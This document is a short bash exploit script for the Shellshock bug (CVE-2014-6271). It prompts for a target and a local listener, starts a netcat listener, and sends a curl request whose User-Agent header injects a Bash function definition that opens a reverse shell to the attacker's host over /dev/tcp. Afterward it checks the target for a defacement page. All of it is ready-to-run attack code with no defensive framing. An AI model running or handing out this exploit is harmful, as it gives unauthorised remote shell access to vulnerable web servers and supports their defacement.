#!/bin/bash

clear

echo 'S.H.E.L.L*S.H.O.C.K.E.R'
echo 'This shell-script for CVE-2014-6271'

figlet 'ShellShocker' | sed 's|^|# |g'

read -p "Input_Target: " ip

read -p "Input_Port: " port

read -p "Input_Directory: " dir

read -p "Input_LocalHost: " Lhost

read -p "Input_LocalPort: " Lport

echo '[*] Sending the exploit...'

echo '[*] Target IP address is : '$ip

echo '[*] Target Port is : '$port

gnome-terminal -- nc -lvp $Lport 

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/$Lhost/$Lport 0>&1'" http://$ip:$port/$dir && \
echo '[*] Target exploited, testing, testing if defacement page is deployed' && \

curl http://$ip:$port

echo '[+]Done'
